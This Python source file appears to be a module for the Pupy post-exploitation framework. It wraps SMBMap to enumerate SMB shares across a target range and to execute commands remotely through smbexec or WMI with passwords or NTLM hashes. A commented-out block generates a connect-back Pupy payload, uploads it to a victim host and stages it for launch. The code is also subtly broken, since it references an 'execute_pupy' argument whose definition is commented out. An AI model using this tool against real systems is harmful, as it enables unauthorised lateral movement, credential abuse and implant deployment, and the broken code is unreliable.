# -*- coding: UTF8 -*-
# Author: byt3bl33d3r and Shawn Evans
# Version used from the "rewrite" branch of smbmap written by byt3bl33d3r 
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdo
import pupygen
import re
import os
import tempfile
import random
import string
from rpyc.utils.classic import upload

__class_name__="SMBMap"

@config(cat="admin")
class SMBMap(PupyModule):
    """ SMBMap - Samba Share Enumerator | Shawn Evans and byt3bl33d3r """

    def init_argparse(self):
        
        self.arg_parser = PupyArgumentParser(prog="smbmap", description=self.__doc__)
        self.arg_parser.add_argument("-u", metavar="USERNAME", dest='user', default='', help="Username, if omitted null session assumed")
        self.arg_parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default='', help="Password")
        self.arg_parser.add_argument("-H", metavar="HASH", dest='hash', default='', help='NTLM hash')
        self.arg_parser.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default WORKGROUP)")
        self.arg_parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$)")
        self.arg_parser.add_argument("-P", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default 445)")
        self.arg_parser.add_argument("-S", action="store_true", default=False, dest="list_shares", help="List shares")
        # self.arg_parser.add_argument("-E", action="store_true", default=False, dest="execute_pupy", help="Launch a Pupy shell")
        self.arg_parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")

        sgroup = self.arg_parser.add_argument_group("Command Execution", "Options for executing commands on the specified host")
        sgroup.add_argument('-execm', choices={"smbexec", "wmi"}, dest="execm", default="smbexec", help="Method to execute the command (default: smbexec)")
        sgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute a command")
    
    def run(self, args):

        if "/" in args.target[0]:
            hosts = IPNetwork(args.target[0])
        else:
            hosts = list()
            hosts.append(args.target[0])
        
        src = ''
        dst = ''
        random_pupy_name = ''
        # if args.execute_pupy:
        #     random_pupy_name = ''.join(random.sample(string.ascii_letters, 10)) + '.txt'
            
        #     res=self.client.conn.modules['pupy'].get_connect_back_host()
        #     h, p = res.rsplit(':',1)
        #     self.info("Address configured is %s:%s for pupy dll..."%(h,p))
        #     self.info("Creating localy a Pupy dll")
             
        #     pupygen.create_ps1_file(self.client.get_conf(), random_pupy_name, tempfile.gettempdir(), "x86")
        #     pupyDLLLocalPath = os.path.join(tempfile.gettempdir(),random_pupy_name)
        #     print pupyDLLLocalPath
        #     return
            
        #     # upload the binary to the current session
        #     # remoteTempFolder=self.client.conn.modules['os.path'].expandvars("%TEMP%") # Do a remote path for linux machine
        #     remoteTempFolder=self.client.conn.modules['os.path'].expandvars("%ALLUSERSPROFILE%") # Do a remote path for linux machine
        #     # remoteTempFolder="C:\\Temp\\" # Do a remote path for linux machine
        #     pupyDLLRemotePath = "{0}".format(self.client.conn.modules['os.path'].join(remoteTempFolder, random_pupy_name))
            
        #     self.info("Uploading pupy dll in {0}".format(pupyDLLRemotePath))
        #     upload(self.client.conn, pupyDLLLocalPath, pupyDLLRemotePath)
        #     self.info("File uploaded")
        #     src = pupyDLLRemotePath
        #     dst = '%s\\Temp\\%s' % (args.share, random_pupy_name)

        self.info("Loading dependencies")
        self.client.load_package("impacket")
        self.client.load_package("calendar")
        self.client.load_package("pupyutils.smbmap")

        with redirected_stdo(self.client.conn):
            for host in hosts:
                self.info("Connecting to the remote host: %s" % host)
                self.client.conn.modules["pupyutils.smbmap"].connect(host, args.port, args.user, args.passwd, args.hash, args.share, args.list_shares, args.execute_pupy, random_pupy_name, src, dst, args.command, args.domain, args.execm)
    